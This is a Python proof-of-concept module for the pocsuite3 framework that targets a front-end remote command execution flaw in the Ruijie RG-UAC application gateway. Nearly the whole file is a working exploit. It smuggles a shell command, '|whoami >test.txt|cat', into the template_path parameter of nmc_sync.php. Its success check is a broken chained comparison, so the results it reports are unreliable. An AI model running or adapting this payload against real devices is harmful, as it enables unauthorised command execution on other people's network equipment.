# -*- coding: utf-8 -*-
# 2023/12/10 15:53

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OrderedDict, OptString


class RG_UAC_RCE(POCBase):
    author = '炼金术师诸葛亮'
    createDate = '2023-12-10'
    name = 'RG-UAC-RCE'
    appName = 'RG-UAC-RCE'
    vulType = 'Command Execution'  # 漏洞类型，参见漏洞类型规范表
    desc = '锐捷RG-UAC应用网关-前台RCE漏洞。'  # 漏洞简要描述

    def _verify(self):
        result = {}
        path = "/view/systemConfig/management/nmc_sync.php"  # 参数
        url = self.url + path
        payload = "?center_ip=127.0.0.1&template_path=|whoami >test.txt|cat"  # payload
        r = requests.get(url + payload)
        print(r.text)
        # 验证成功输出相关信息
        if r and r.status_code == 200 in r.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Name'] = payload

        return self.parse_output(result)



register_poc(RG_UAC_RCE)